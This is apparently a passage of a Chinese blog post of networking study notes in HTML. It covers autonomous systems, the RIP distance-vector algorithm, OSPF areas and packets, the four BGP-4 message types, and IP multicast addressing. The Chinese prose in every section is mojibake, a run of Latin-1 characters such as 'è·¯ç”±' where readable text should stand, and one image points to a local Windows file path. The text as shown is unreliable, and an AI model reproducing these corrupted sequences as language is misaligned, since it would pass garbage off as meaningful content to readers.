ç‰¹ç½‘çš„åŒæ—¶è¿˜è¦éšè—è‡ªå·±çš„è·¯ç”±é€‰æ‹©åè®®ï¼Œè¿™é‡Œå°±æ¶‰åŠåˆ°ä¸€ä¸ªè‡ªæ²»ç³»ç»ŸASçš„æ¦‚å¿µ</p><p><strong>è‡ªæ²»ç³»ç»ŸAS</strong></p><p>åœ¨å•ä¸€çš„æŠ€æœ¯ç®¡ç†ä¸‹çš„ä¸€ç»„è·¯ç”±å™¨ï¼Œè€Œè¿™äº›è·¯ç”±å™¨ä½¿ç”¨ä¸€ç§ASå†…éƒ¨çš„è·¯ç”±é€‰æ‹©åè®®å’Œå…±åŒçš„åº¦é‡ä»¥ç¡®å®šåˆ†ç»„åœ¨è¯¥ASå†…çš„è·¯ç”±ï¼ŒåŒæ—¶è¿˜ä½¿ç”¨ä¸€ç§ASä¹‹é—´çš„è·¯ç”±åè®®ä»¥ç¡®å®šåœ¨ASä¹‹é—´çš„è·¯ç”±ã€‚ä¸ªASå†…çš„æ‰€æœ‰ç½‘ç»œéƒ½å±äºä¸€ä¸ªè¡Œæ”¿å•ä½æ¥ç®¡è¾–ï¼Œä¸€ä¸ªè‡ªæ²»ç³»ç»Ÿçš„æ‰€æœ‰è·¯ç”±å™¨åœ¨æœ¬è‡ªæ²»ç³»ç»Ÿå†…éƒ½å¿…é¡»è¿é€š</p><p><strong>è·¯ç”±é€‰æ‹©åè®®åˆåˆ†ä¸ºä¸¤ç§</strong></p><p><img src="http://cdn.clown2024.cn/202407151707737.png" alt="image-20240307125518139"></p><blockquote><p>ç°åœ¨å¸¸ç”¨çš„æ˜¯BGP-4</p></blockquote><h1 id="ripåè®®"><a href="#RIPåè®®" class="headerlink" title="RIPåè®®"></a>RIPåè®®</h1><p><strong>å®šä¹‰</strong></p><p>RIPæ˜¯ä¸€ç§åˆ†å¸ƒå¼çš„åŸºäºè·ç¦»å‘é‡çš„è·¯ç”±é€‰æ‹©åè®®ï¼Œæ˜¯å› ç‰¹ç½‘çš„åè®®æ ‡å‡†ï¼Œæœ€å¤§ä¼˜ç‚¹æ˜¯ç®€å•ï¼›å®ƒé€‚ç”¨äºå°å‹ç½‘ç»œã€‚</p><p><strong>ç›¸å…³è§„åˆ™</strong></p><p>RIPåè®®è¦æ±‚ç½‘ç»œä¸­æ¯ä¸€ä¸ªè·¯ç”±å™¨éƒ½ç»´æŠ¤ä»å®ƒè‡ªå·±åˆ°å…¶ä»–æ¯ä¸€ä¸ªç›®çš„ç½‘ç»œçš„å”¯ä¸€æœ€ä½³è·ç¦»è®°å½•(å³ä¸€ç»„è·ç¦»)</p><p>&#x3D;&#x3D;è·ç¦»ï¼š&#x3D;&#x3D;é€šå¸¸ä¸ºâ€œè·³æ•°â€ï¼Œå³ä»æºç«¯å£åˆ°ç›®çš„ç«¯å£æ‰€ç»è¿‡çš„è·¯ç”±å™¨ä¸ªæ•°ï¼Œç»è¿‡ä¸€ä¸ªè·¯ç”±å™¨è·³æ•°+1ã€‚ç‰¹åˆ«çš„ï¼Œä»ç”±å™¨åˆ°ç›´æ¥è¿æ¥çš„ç½‘ç»œè·ç¦»ä¸º1ã€‚RIPå…è®¸ä¸€æ¡è·¯ç”±æœ€å¤šåªèƒ½åŒ…å«15ä¸ªè·¯ç”±å™¨ï¼Œå› æ­¤è·ç¦»ä¸º16è¡¨ç¤ºç½‘ç»œä¸å¯è¾¾<br>ä¸€è·¯</p><p>ä¸€ä¸ªç¤ºä¾‹å›¾ï¼š</p><p><img src="http://cdn.clown2024.cn/202407151707738.png" alt="image-20240309012809494"></p><h2 id="ripåè®®äº¤æ¢è§„åˆ™"><a href="#RIPåè®®äº¤æ¢è§„åˆ™" class="headerlink" title="RIPåè®®äº¤æ¢è§„åˆ™"></a>RIPåè®®äº¤æ¢è§„åˆ™</h2><ol><li>ä»…å’Œç›¸é‚»è·¯ç”±å™¨äº¤æ¢ä¿¡æ¯</li><li>è·¯ç”±å™¨äº¤æ¢çš„ä¿¡æ¯æ˜¯è‡ªå·±çš„è·¯ç”±è¡¨</li><li>æ¯30ç§’äº¤æ¢ä¸€æ¬¡è·¯ç”±ä¿¡æ¯ï¼Œç„¶åè·¯ç”±å™¨æ ¹æ®æ–°ä¿¡æ¯æ›´æ–°è·¯ç”±è¡¨ã€‚è‹¥è¶…è¿‡180sæ²¡æ”¶åˆ°é‚»å±…è·¯ç”±å™¨çš„é€šå‘Šï¼Œåˆ™åˆ¤å®šé‚»å±…æ²¡äº†ï¼Œå¹¶æ›´æ–°è‡ªå·±è·¯ç”±è¡¨ã€‚</li></ol><blockquote><p>è·¯ç”±å™¨åˆšå¼€å§‹å·¥ä½œæ—¶ï¼ŒåªçŸ¥é“ç›´æ¥è¿æ¥çš„ç½‘ç»œçš„è·ç¦»(è·ç¦»ä¸º1)ï¼Œæ¥ç€æ¯ä¸€ä¸ªè·¯ç”±å™¨ä¹Ÿåªå’Œæ•°ç›®éå¸¸æœ‰é™çš„ç›¸è·¯ç”±å™¨äº¤æ¢å¹¶æ›´æ–°è·¯ç”±ä¿¡æ¯ã€‚</p><p>ç»è¿‡è‹¥å¹²æ¬¡æ›´æ–°åï¼Œæ‰€æœ‰è·¯ç”±å™¨æœ€ç»ˆéƒ½ä¼šçŸ¥é“åˆ°è¾¾æœ¬è‡ªæ²»ç³»ç»Ÿä»»ä½•ä¸€ä¸ªç½‘ç»œçš„æœ€çŸ­è·ç¦»å’Œä¸‹ä¸€è·³è·¯ç”±å™¨çš„åœ°å€,å³â€œæ”¶æ•›</p></blockquote><h2 id="è·ç¦»å‘é‡ç®—æ³•"><a href="#è·ç¦»å‘é‡ç®—æ³•" class="headerlink" title="è·ç¦»å‘é‡ç®—æ³•"></a>è·ç¦»å‘é‡ç®—æ³•</h2><ol><li><p>ä¿®æ”¹ç›¸é‚»è·¯ç”±å™¨å‘æ¥çš„RIPæŠ¥æ–‡ä¸­æ‰€æœ‰è¡¨é¡¹ã€‚</p><p>å¯¹åœ°å€ä¸ºXçš„ç›¸é‚»è·¯ç”±å™¨å‘æ¥çš„RIPæŠ¥æ–‡ï¼Œä¿®æ”¹æ­¤æŠ¥æ–‡ä¸­çš„æ‰€æœ‰é¡¹ç›®ï¼šæŠŠâ€œä¸‹ä¸€è·³â€å­—æ®µä¸­çš„åœ°å€æ”¹ä¸ºXï¼Œå¹¶æŠŠ<br>æ‰€æœ‰çš„â€œè·ç¦»â€å­—æ®µ+1ã€‚</p><p>è¿™é‡Œç”¨ä¸€ä¸ªæ¼”ç¤ºå›¾è§£é‡Šä¸€ä¸‹ï¼š</p><p><img src="http://cdn.clown2024.cn/202407151707739.png" alt="image-20240309013653735"></p><p>ä¸xç›¸é‚»çš„è·¯ç”±ä¸ºR1ï¼Œxå°±æŠŠè‡ªå·±çš„ä¸Šå›¾è·¯ç”±è¡¨å‘ç»™R1ï¼ŒåŸæ¥çš„è·¯ç”±è¡¨è¡¨ç¤ºï¼Œåˆ°Net3ç½‘ç»œçš„æœ€çŸ­è·¯å¾„ä¸º2è·³ï¼Œä¸‹ä¸€è·³ä¸ºR2ï¼ŒR1æ”¶åˆ°åå°±ç›´æ¥é¡ºç€ä¿®æ”¹æˆåˆ°Net3çš„æœ€çŸ­è·¯å¾„ä¸º3ï¼Œä¸‹ä¸€è·³ä¸ºx</p></li><li><p>å¯¹ä¿®æ”¹åçš„RIPæŠ¥æ–‡ä¸­çš„æ¯ä¸€ä¸ªé¡¹ç›®ï¼Œè¿›è¡Œä»¥ä¸‹æ­¥éª¤ï¼š</p><ul><li><p>R1è·¯ç”±è¡¨ä¸­è‹¥æ²¡æœ‰Net3ï¼Œåˆ™æŠŠè¯¥é¡¹ç›®å¡«å…¥R1è·¯ç”±è¡¨ã€‚</p></li><li><p>R1è·¯ç”±è¡¨ä¸­è‹¥æœ‰Net3ï¼Œåˆ™æŸ¥çœ‹ä¸‹ä¸€è·³è·¯ç”±å™¨åœ°å€ï¼š</p><p>è‹¥ä¸‹ä¸€è·³æ˜¯Xä¸ç®¡è·ç¦»å¤§å°ï¼Œåˆ™ç”¨æ”¶åˆ°çš„é¡¹ç›®æ›¿æ¢æºè·¯ç”±è¡¨ä¸­çš„é¡¹ç›®ï¼›</p><p>è‹¥ä¸‹ä¸€è·³ä¸æ˜¯Xï¼Œæ¯”è¾ƒåŸæ¥è·ç¦»æ¯”ä»Xèµ°çš„è·ç¦»è¿œåˆ™æ›´æ–°ï¼Œå¦åˆ™ä¸ä½œå¤„ç†ã€‚</p></li></ul></li><li><p>è‹¥180sè¿˜æ²¡æ”¶åˆ°ç›¸é‚»è·¯ç”±å™¨Xçš„æ›´æ–°è·¯ç”±è¡¨ï¼Œåˆ™æŠŠXè®°ä¸ºä¸å¯è¾¾çš„è·¯ç”±å™¨ï¼Œå³æŠŠè·ç¦»è®¾ç½®ä¸º16ã€‚</p></li><li><p>è¿”å›ã€‚</p></li></ol><h2 id="ripåè®®æŠ¥æ–‡æ ¼å¼"><a href="#RIPåè®®æŠ¥æ–‡æ ¼å¼" class="headerlink" title="RIPåè®®æŠ¥æ–‡æ ¼å¼"></a>RIPåè®®æŠ¥æ–‡æ ¼å¼</h2><p><img src="http://cdn.clown2024.cn/202407151707740.png" alt="image-20240309015032452"></p><h2 id="ripç‰¹ç‚¹"><a href="#RIPç‰¹ç‚¹" class="headerlink" title="RIPç‰¹ç‚¹"></a>RIPç‰¹ç‚¹</h2><p><img src="C:/Users/86189/AppData/Roaming/Typora/typora-user-images/image-20240309015302320.png" alt="image-20240309015302320"></p><p>è¦ä¸æ–­é‡å¤æ›´æ–°ä¸‹å»ï¼Œç›´åˆ°åŒæ–¹è·¯ç”±è¡¨åˆ°ç½‘1çš„è·ç¦»éƒ½æ›´æ–°åˆ°16ï¼ŒR1å’ŒR2æ‰çŸ¥é“ç½‘ç»œ1æ˜¯ä¸å¯è¾¾çš„ã€‚</p><h1 id="ospfåè®®"><a href="#OSPFåè®®" class="headerlink" title="OSPFåè®®"></a>OSPFåè®®</h1><p><strong>å®šä¹‰</strong><br>å¼€æ”¾æœ€çŸ­è·¯å¾„ä¼˜å…ˆOSPFåè®®:â€œå¼€æ”¾â€æ ‡æ˜OSPFåè®®ä¸æ˜¯å—æŸä¸€å®¶å‚å•†æ§åˆ¶ï¼Œè€Œæ˜¯å…¬å¼€å‘è¡¨çš„ï¼šâ€æœ€çŸ­è·¯å¾„ä¼˜å…ˆâ€œæ˜¯å› ä¸ºä½¿ç”¨äº†Diikstraæå‡ºçš„æœ€çŸ­è·¯å¾„ç®—æ³•SPFã€‚</p><p>OSPFæœ€ä¸»è¦çš„ç‰¹å¾å°±æ˜¯ä½¿ç”¨åˆ†å¸ƒå¼çš„é“¾è·¯çŠ¶æ€åè®®ã€‚</p><p><strong>OSPFçš„ç‰¹ç‚¹</strong></p><ol><li>ä½¿ç”¨æ´ªæ³›æ³•å‘è‡ªæ²»ç³»ç»Ÿå†…æ‰€æœ‰è·¯ç”±å™¨å‘é€ä¿¡æ¯ï¼Œå³è·¯ç”±å™¨é€šè¿‡è¾“å‡ºç«¯å£å‘æ‰€æœ‰ç›¸é‚»çš„è·¯ç”±å™¨å‘é€ä¿¡æ¯ï¼Œè€Œæ¯ä¸€ä¸ªç›¸é‚»è·¯ç”±å™¨åˆå†æ¬¡å°†æ­¤ä¿¡æ¯å‘å¾€å…¶æ‰€æœ‰çš„ç›¸é‚»è·¯ç”±å™¨ï¼›å°±ç›¸å½“äºå¹¿æ’­ä¿¡æ¯å‡ºå»ã€‚æœ€ç»ˆæ•´ä¸ªåŒºåŸŸå†…çš„è·¯ç”±å™¨å°±å¾—åˆ°äº†è¿™ä¸ªä¿¡æ¯çš„ä¸€ä¸ªå‰¯æœ¬ã€‚</li><li>å‘é€çš„ä¿¡æ¯å°±æ˜¯ä¸æœ¬è·¯ç”±å™¨ç›¸é‚»çš„æ‰€æœ‰è·¯ç”±å™¨çš„é“¾è·¯çŠ¶æ€(æœ¬è·¯ç”±å™¨å’Œå“ªäº›è·¯ç”±å™¨ç›¸é‚»ï¼Œä»¥åŠè¯¥é“¾è·¯çš„åº¦<br>é‡&#x2F;ä»£ä»·â€“è´¹ç”¨ã€è·ç¦»ã€æ—¶å»¶ã€å¸¦å®½ç­‰)ã€‚</li><li>åªæœ‰å½“é“¾è·¯çŠ¶æ€å‘ç”Ÿå˜åŒ–æ—¶ï¼Œè·¯ç”±å™¨æ‰å‘æ‰€æœ‰è·¯ç”±å™¨æ´ªæ³›å‘é€æ­¤ä¿¡æ¯ã€‚</li></ol><blockquote><p>æœ€åï¼Œæ‰€æœ‰è·¯ç”±å™¨éƒ½èƒ½å»ºç«‹ä¸€ä¸ªé“¾è·¯çŠ¶æ€æ•°æ®åº“ï¼Œå³å…¨ç½‘æ‹“æ‰‘å›¾ã€‚</p></blockquote><h2 id="é“¾è·¯çŠ¶æ€è·¯ç”±ç®—æ³•"><a href="#é“¾è·¯çŠ¶æ€è·¯ç”±ç®—æ³•" class="headerlink" title="é“¾è·¯çŠ¶æ€è·¯ç”±ç®—æ³•"></a>é“¾è·¯çŠ¶æ€è·¯ç”±ç®—æ³•</h2><p><img src="http://cdn.clown2024.cn/202407151707741.png" alt="image-20240309093424516"></p><h2 id="ospfçš„åŒºåŸŸ"><a href="#OSPFçš„åŒºåŸŸ" class="headerlink" title="OSPFçš„åŒºåŸŸ"></a>OSPFçš„åŒºåŸŸ</h2><p> OSPFå¸¸ç”¨äºè§„æ¨¡å¾ˆå¤§çš„ç½‘ç»œï¼ŒOSPFå°†ä¸€ä¸ªè‡ªæ²»ç³»ç»Ÿå†åˆ’åˆ†ä¸ºè‹¥å¹²ä¸ªæ›´å°çš„èŒƒå›´ï¼Œå«åšåŒºåŸŸï¼›æ¯ä¸€ä¸ªåŒºåŸŸéƒ½æœ‰ä¸€ä¸ª32ä½çš„åŒºåŸŸæ ‡è¯†ç¬¦(ç”¨ç‚¹åˆ†åè¿›åˆ¶è¡¨ç¤º)ï¼ŒåŒºåŸŸä¹Ÿä¸èƒ½å¤ªå¤§ï¼Œåœ¨ä¸€ä¸ªåŒºåŸŸå†…çš„è·¯ç”±å™¨æœ€å¥½ä¸è¶…è¿‡200ä¸ªã€‚</p><p><img src="http://cdn.clown2024.cn/202407151707742.png" alt="image-20240309093653477"></p><blockquote><p>ä½äºä¸»å¹²è¾¹ç•Œçš„è·¯ç”±å™¨ï¼Œæ¯”å¦‚R3ï¼ŒR4ï¼ŒR7ï¼›æ—¢å±äºä¸»å¹²è·¯ç”±å™¨ä¹Ÿå±äºåŒºåŸŸè¾¹ç•Œè·¯ç”±å™¨</p><p>è‡ªæ²»ç³»ç»Ÿè¾¹ç•Œè·¯ç”±å™¨å°±æ˜¯ä¸å¤–ç•Œè¿æ¥æ¯”å¦‚å…¶ä»–ASçš„è·¯ç”±å™¨ã€‚</p></blockquote><h2 id="ospfåˆ†ç»„"><a href="#OSPFåˆ†ç»„" class="headerlink" title="OSPFåˆ†ç»„"></a>OSPFåˆ†ç»„</h2><p><img src="http://cdn.clown2024.cn/202407151707743.png" alt="image-20240309094030723"></p><blockquote><p>å…³äºOSPFå±äºå“ªä¸€å±‚åè®®æœ‰ç‚¹äº‰è®®ï¼Œåˆ¤æ–­æŸä¸ªåè®®å±äºå“ªä¸€å±‚ï¼šä¸€ä¸ªåè®®çš„å®ç°éœ€è¦ä¾èµ–åè®®æ‰€åœ¨å±‚æ¬¡çš„ä¸‹ä¸€å±‚åŠŸèƒ½ï¼›æ‰€ä»¥RIPä¾èµ–UDPæ‰€ä»¥æ˜¯åº”ç”¨å±‚åè®®ã€‚</p><p>è€ŒOSPFä¾èµ–ç½‘ç»œå±‚ï¼Œå±äºä¼ è¾“å±‚åè®®ï¼›ä½†æ˜¯åœ¨è€ƒç ”çš„è€ƒçº²ä¸­ï¼ŒOSPFæ˜¯ä¸ä½¿ç”¨UDPæ•°æ®æŠ¥ä¼ é€ï¼Œè€Œæ˜¯ç›´æ¥ä½¿ç”¨IPæ•°æ®æŠ¥ä¼ é€ï¼Œæ‰€ä»¥è¢«åˆ’åˆ†åˆ°ç½‘ç»œå±‚åè®®ã€‚</p></blockquote><h2 id="å…¶ä»–ç‰¹ç‚¹"><a href="#å…¶ä»–ç‰¹ç‚¹" class="headerlink" title="å…¶ä»–ç‰¹ç‚¹"></a>å…¶ä»–ç‰¹ç‚¹</h2><p><img src="http://cdn.clown2024.cn/202407151707744.png" alt="image-20240309095051174"></p><h1 id="bgpåè®®"><a href="#BGPåè®®" class="headerlink" title="BGPåè®®"></a>BGPåè®®</h1><p><strong>äº¤æ¢ä¿¡æ¯çš„ç‰¹ç‚¹</strong></p><ul><li>ä¸å…¶ä»–ASçš„é‚»ç«™BGPå‘è¨€äººäº¤æ¢ä¿¡æ¯ã€‚</li><li>äº¤æ¢çš„ç½‘ç»œå¯è¾¾æ€§çš„ä¿¡æ¯ï¼Œå³è¦åˆ°è¾¾æŸä¸ªç½‘ç»œæ‰€è¦ç»è¿‡çš„ä¸€ç³»åˆ—ASã€‚</li><li>å‘ç”Ÿå˜åŒ–æ—¶æ›´æ–°æœ‰å˜åŒ–çš„éƒ¨åˆ†ã€‚</li></ul><p><img src="http://cdn.clown2024.cn/202407151707745.png" alt="image-20240309095348561"></p><blockquote><p>å‘è¨€äººä¹Ÿä¸ä¸€å®šè¦æ˜¯è¾¹ç•Œè·¯ç”±å™¨ï¼Œå¯ä»¥è‡ªå·±è®¾å®šã€‚</p><p>BGPåè®®äº¤æ¢å†…å®¹é¦–æ¬¡ä¸ºæ•´ä¸ªè·¯ç”±è¡¨ï¼Œåé¢åˆ™ä¸ºæœ‰å˜åŒ–çš„éƒ¨åˆ†ã€‚</p></blockquote><h2 id="bgpäº¤æ¢ä¿¡æ¯è¿‡ç¨‹"><a href="#BGPäº¤æ¢ä¿¡æ¯è¿‡ç¨‹" class="headerlink" title="BGPäº¤æ¢ä¿¡æ¯è¿‡ç¨‹"></a>BGPäº¤æ¢ä¿¡æ¯è¿‡ç¨‹</h2><p>BGP æ‰€äº¤æ¢çš„ç½‘ç»œå¯è¾¾æ€§çš„ä¿¡æ¯å°±æ˜¯è¦åˆ°è¾¾æŸä¸ªç½‘ç»œæ‰€è¦ç»è¿‡çš„ä¸€ç³»åˆ— ASã€‚å½“ BGP å‘è¨€äººäº’ç›¸äº¤æ¢äº†ç½‘ç»œå¯<br>æ€§çš„ä¿¡æ¯åï¼Œå„ BGPå‘è¨€äººå°±æ ¹æ®æ‰€é‡‡ç”¨çš„ç­–ç•¥ä»æ”¶åˆ°çš„è·¯ç”±ä¿¡æ¯ä¸­æ‰¾å‡ºåˆ°è¾¾å„ ASçš„è¾ƒå¥½è·¯ç”±ã€‚</p><ul><li><p>BGPå‘è¨€äººäº¤æ¢è·¯å¾„å‘é‡ï¼š</p><p><img src="http://cdn.clown2024.cn/202407151707746.png" alt="image-20240309095956540"></p><p>ä¸»å¹²ç½‘è¿˜å¯å‘å‡ºé€šçŸ¥ï¼šè¦åˆ°è¾¾ç½‘ç»œN5ã€N6å’ŒN7å¯æ²¿è·¯å¾„(AS1,AS3)ã€‚</p></li></ul><h2 id="bgpåè®®æŠ¥æ–‡æ ¼å¼"><a href="#BGPåè®®æŠ¥æ–‡æ ¼å¼" class="headerlink" title="BGPåè®®æŠ¥æ–‡æ ¼å¼"></a>BGPåè®®æŠ¥æ–‡æ ¼å¼</h2><p>ä¸€ä¸ªBGP å‘è¨€äººä¸å…¶ä»–è‡ªæ²»ç³»ç»Ÿä¸­çš„ BGP å‘è¨€äººè¦äº¤æ¢è·¯ç”±ä¿¡æ¯ï¼Œå°±è¦å…ˆå»ºç«‹ TCP è¿æ¥ï¼Œå³é€šè¿‡TCPä¼ é€ï¼Œç„¶ååœ¨æ­¤è¿æ¥ä¸Šäº¤æ¢ BGP æŠ¥æ–‡ä»¥å»ºç«‹ BGP ä¼šè¯(session)ï¼Œåˆ©ç”¨ BGP ä¼šè¯äº¤æ¢è·¯ç”±ä¿¡æ¯ã€‚</p><p><img src="http://cdn.clown2024.cn/202407151707747.png" alt="image-20240309100149532"></p><h2 id="bgpåè®®ç‰¹ç‚¹"><a href="#BGPåè®®ç‰¹ç‚¹" class="headerlink" title="BGPåè®®ç‰¹ç‚¹"></a>BGPåè®®ç‰¹ç‚¹</h2><p>BGP æ”¯æŒ CIDRï¼Œå› æ­¤ BGP çš„è·¯ç”±è¡¨ä¹Ÿå°±åº”å½“åŒ…æ‹¬ç›®çš„ç½‘ç»œå‰ç¼€ã€ä¸‹ä¸€è·³è·¯ç”±å™¨ï¼Œä»¥åŠåˆ°è¾¾è¯¥ç›®çš„ç½‘ç»œæ‰€è¦ç»è¿‡çš„å„ä¸ªè‡ªæ²»ç³»ç»Ÿåºåˆ—ã€‚</p><p>åœ¨ BGP åˆšåˆšè¿è¡Œæ—¶ï¼ŒBGPçš„é‚»ç«™æ˜¯äº¤æ¢æ•´ä¸ªçš„ BGPè·¯ç”±è¡¨ã€‚ä½†ä»¥ååªéœ€è¦åœ¨å‘ç”Ÿå˜åŒ–æ—¶æ›´æ–°æœ‰å˜åŒ–çš„éƒ¨åˆ†ã€‚è¿™æ ·åšå¯¹èŠ‚çœç½‘ç»œå¸¦å®½å’Œå‡å°‘è·¯ç”±å™¨çš„å¤„ç†å¼€é”€éƒ½æœ‰å¥½å¤„ã€‚</p><h2 id="bgp-4çš„å››ç§æŠ¥æ–‡"><a href="#BGP-4çš„å››ç§æŠ¥æ–‡" class="headerlink" title="BGP-4çš„å››ç§æŠ¥æ–‡"></a>BGP-4çš„å››ç§æŠ¥æ–‡</h2><ol><li><p><strong>OPEN(æ‰“å¼€)æŠ¥æ–‡ï¼š</strong>ç”¨æ¥ä¸ç›¸é‚»çš„å¦ä¸€ä¸ªBGPå‘è¨€äººå»ºç«‹å…³ç³»ï¼Œå¹¶è®¤è¯å‘é€æ–¹ã€‚</p></li><li><p><strong>UPDATE(æ›´æ–°)æŠ¥æ–‡ï¼š</strong>é€šå‘Šæ–°è·¯å¾„æˆ–æ’¤é”€åŸè·¯å¾„ã€‚</p></li><li><p><strong>KEEPALIVE(ä¿æ´»)æŠ¥æ–‡ï¼š</strong>åœ¨æ— UPDATEæ—¶ï¼Œå‘¨æœŸæ€§è¯å®é‚»ç«™çš„è¿é€šæ€§ï¼›ä¹Ÿä½œä¸ºOPENçš„ç¡®è®¤ã€‚</p></li><li><p><strong>NOTIFICATION(é€šçŸ¥)æŠ¥æ–‡ï¼š</strong>æŠ¥å‘Šå…ˆå‰æŠ¥æ–‡çš„å·®é”™;ä¹Ÿè¢«ç”¨äºå…³é—­è¿æ¥ã€‚</p></li></ol><h1 id="ä¸‰ç§è·¯ç”±åè®®çš„æ¯”è¾ƒ"><a href="#ä¸‰ç§è·¯ç”±åè®®çš„æ¯”è¾ƒ" class="headerlink" title="ä¸‰ç§è·¯ç”±åè®®çš„æ¯”è¾ƒ"></a>ä¸‰ç§è·¯ç”±åè®®çš„æ¯”è¾ƒ</h1><p><img src="http://cdn.clown2024.cn/202407151707748.png" alt="image-20240309100705696"></p><h1 id="ipç»„æ’­"><a href="#IPç»„æ’­" class="headerlink" title="IPç»„æ’­"></a>IPç»„æ’­</h1><h2 id="ipæ•°æ®æŠ¥çš„ä¸‰ç§ä¼ è¾“æ–¹å¼"><a href="#IPæ•°æ®æŠ¥çš„ä¸‰ç§ä¼ è¾“æ–¹å¼" class="headerlink" title="IPæ•°æ®æŠ¥çš„ä¸‰ç§ä¼ è¾“æ–¹å¼"></a>IPæ•°æ®æŠ¥çš„ä¸‰ç§ä¼ è¾“æ–¹å¼</h2><ol><li><strong>å•æ’­ï¼š</strong>å•æ’­ç”¨äºå‘é€æ•°æ®åŒ…åˆ°å•ä¸ªç›®çš„åœ°ï¼Œä¸”æ¯å‘é€ä¸€ä»½å•æ’­æŠ¥æ–‡éƒ½ä½¿ç”¨ä¸€ä¸ªå•æ’­IPåœ°å€ä½œä¸ºç›®çš„åœ°å€ã€‚æ˜¯ä¸€ç§ç‚¹å¯¹ç‚¹ä¼ è¾“æ–¹å¼ã€‚</li><li><strong>å¹¿æ’­ï¼š</strong>å¹¿æ’­æ˜¯æŒ‡å‘é€æ•°æ®åŒ…åˆ°åŒä¸€å¹¿æ’­åŸŸæˆ–å­ç½‘å†…çš„æ‰€æœ‰è®¾å¤‡çš„ä¸€ç§æ•°æ®ä¼ è¾“æ–¹å¼ï¼Œæ˜¯ä¸€ç§ç‚¹å¯¹å¤šç‚¹ä¼ è¾“æ–¹å¼ã€‚</li><li><strong>ç»„æ’­(å¤šæ’­)ï¼š</strong>å½“ç½‘ç»œä¸­çš„æŸäº›ç”¨æˆ·éœ€è¦ç‰¹å®šæ•°æ®æ—¶ï¼Œç»„æ’­æ•°æ®å‘é€è€…ä»…å‘é€ä¸€æ¬¡æ•°æ®ï¼Œå€ŸåŠ©ç»„æ’­è·¯ç”±åè®®ä¸ºç»„æ’­æ•°æ®åŒ…å»ºç«‹ç»„æ’­åˆ†å‘æ ‘ï¼Œè¢«ä¼ é€’çš„æ•°æ®åˆ°è¾¾è·ç¦»ç”¨æˆ·ç«¯å°½å¯èƒ½è¿‘çš„èŠ‚ç‚¹åæ‰å¼€å§‹å¤åˆ¶å’Œåˆ†å‘ï¼Œæ˜¯ä¸€ç§ç‚¹å¯¹å¤šç‚¹ä¼ è¾“æ–¹å¼ã€‚</li></ol><p>ç»„æ’­æé«˜äº†æ•°æ®ä¼ é€æ•ˆç‡ã€‚å‡å°‘äº†ä¸»å¹²ç½‘å‡ºç°æ‹¥å¡çš„å¯èƒ½æ€§ã€‚ç»„æ’­ç»„ä¸­çš„ä¸»æœºå¯ä»¥æ˜¯åœ¨åŒä¸€ä¸ªç‰©ç†ç½‘ç»œï¼Œä¹Ÿå¯ä»¥æ¥è‡ªä¸åŒçš„ç‰©ç†ç½‘ç»œ(å¦‚æœæœ‰ç»„æ’­è·¯ç”±å™¨çš„æ”¯æŒä¹Ÿå°±æ˜¯è¿è¡Œç»„æ’­åè®®çš„è·¯ç”±å™¨)ã€‚</p><p>ä»¥ä¸€ä¸ªå‘é€è§†é¢‘æ•°æ®çš„å›¾ä¾‹æ¥è§£é‡Šï¼š</p><p><img src="http://cdn.clown2024.cn/202407151707749.png" alt="image-20240309101432054"></p><p>ç»„æ’­åœ¨æ¯æ¡é“¾è·¯ä¸Šåªæœ‰ä¸€ä»½æ•°æ®ï¼Œå¤§å¤§é™ä½ç½‘ç»œæ‹¥å¡çš„å¯èƒ½ï¼›å¦‚æœæ˜¯å•æ’­ä¼ è¾“çš„è¯ï¼ŒæœåŠ¡å™¨å°±è¦å¤åˆ¶90ä»½æ•°æ®ç„¶åè¿›è¡Œåˆ†å‘ï¼Œé“¾è·¯ä¸Šå°±ä¼šå‡ºç°90ä»½æ•°æ®ï¼Œç½‘ç»œæ‹¥å¡ç¨‹åº¦å°±ä¼šä¸Šå‡ã€‚</p><p><img src="http://cdn.clown2024.cn/202407151707750.png" alt="image-20240309101706544"></p><h2 id="ipç»„æ’­åœ°å€"><a href="#IPç»„æ’­åœ°å€" class="headerlink" title="IPç»„æ’­åœ°å€"></a>IPç»„æ’­åœ°å€</h2><p>IPç»„æ’­åœ°å€è®©æºè®¾å¤‡èƒ½å¤Ÿå°†åˆ†ç»„å‘é€ç»™ä¸€ç»„è®¾å¤‡ã€‚å±äºå¤šæ’­ç»„çš„è®¾å¤‡å°†è¢«åˆ†é…ä¸€ä¸ªç»„æ’­ç»„IPåœ°å€(ä¸€ç¾¤å…±åŒéœ€æ±‚<br>ä¸»æœºçš„ç›¸åŒæ ‡è¯†)ã€‚</p><p>ç»„æ’­åœ°å€èŒƒå›´ä¸º224.0.0.0~239.255.255.255(Dç±»åœ°å€)ï¼Œä¸€ä¸ªDç±»åœ°å€è¡¨ç¤ºä¸€ä¸ªç»„æ’­ç»„ã€‚ç»„æ’­åœ°å€åªèƒ½ç”¨ä½œåˆ†ç»„çš„ç›®æ ‡åœ°å€ã€‚æºåœ°å€æ€»æ˜¯ä¸ºå•æ’­åœ°å€ã€‚</p><p><strong>ç»„æ’­æ•°æ®æŠ¥ç‰¹ç‚¹</strong></p><ol><li><p>ç»„æ’­æ•°æ®æŠ¥ä¹Ÿæ˜¯â€œå°½æœ€å¤§åŠªåŠ›äº¤ä»˜â€ï¼Œä¸æä¾›å¯é äº¤ä»˜ï¼Œåº”ç”¨äºUDP</p></li><li><p>å¯¹ç»„æ’­æ•°æ®æŠ¥ä¸äº§ç”ŸICMPå·®é”™æŠ¥æ–‡ã€‚</p></li><li><p>å¹¶éæ‰€æœ‰Dç±»åœ°å€éƒ½å¯ä»¥ä½œä¸ºç»„æ’­åœ°å€ã€‚</p></li></ol><h2 id="ç¡¬ä»¶ç»„æ’­"><a href="#ç¡¬ä»¶ç»„æ’­" class="headerlink" title="ç¡¬ä»¶ç»„æ’­"></a>ç¡¬ä»¶ç»„æ’­</h2><p>åœ¨ä¸Šé¢çš„è§†é¢‘ä¼ è¾“çš„ä¾‹å­ä¸­ï¼Œåˆæœ‰<strong>å› ç‰¹ç½‘èŒƒå›´å†…ç»„æ’­</strong>å’Œ<strong>ç¡¬ä»¶ç»„æ’­</strong>ã€‚</p><p>ç¡¬ä»¶ç»„æ’­æ˜¯åœ¨å±€åŸŸç½‘å†…è¿›è¡Œç»„æ’­ï¼›å› ç‰¹ç½‘ç»„æ’­åˆ™æ˜¯è¿˜æœªè¿›å…¥å±€åŸŸç½‘æ—¶ç»„æ’­ã€‚</p><p><img src="http://cdn.clown2024.cn/202407151707751.png" alt="image-20240309103003239"></p><h2 id="igmpåè®®ä¸ç»„æ’­è·¯ç”±é€‰æ‹©åè®®"><a 